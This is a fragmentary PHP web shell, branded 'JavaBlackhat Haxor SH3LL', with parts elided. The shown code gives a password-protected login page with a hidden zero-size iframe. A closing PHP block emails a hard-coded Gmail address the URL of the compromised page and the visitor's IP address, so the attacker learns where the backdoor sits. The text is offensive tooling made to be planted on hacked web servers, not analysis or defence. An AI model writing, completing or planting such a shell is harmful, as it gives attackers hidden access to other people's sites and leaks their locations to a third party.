...
?>
<title>[x] JVB_SH3LL [x]</title>
<link rel="shortcut icon" href="https://l.top4top.io/p_2023fyn8d0.jpeg" type="image/x-icon"/>
...
<html>
<head>
	<title>SX7 SH3LL</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://l.top4top.io/p_2023fyn8d0.jpeg" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand"> JavaBlackhat</font><font color="white" face="Patrick Hand"> Haxor SH3LL </font><br>
</center>
<center><iframe allow="autoplay" allowfullscreen="" frameborder="0" height="0" src="#" width="0"></iframe></center>


	<form method="post">
		<input type="password" name="password" placeholder="Password">
      <input type="submit" value="JANDAKEUN:V">
		<br>
		<br>
...
$tujuanmail = 'secxploit7@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "MARIJUANA", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
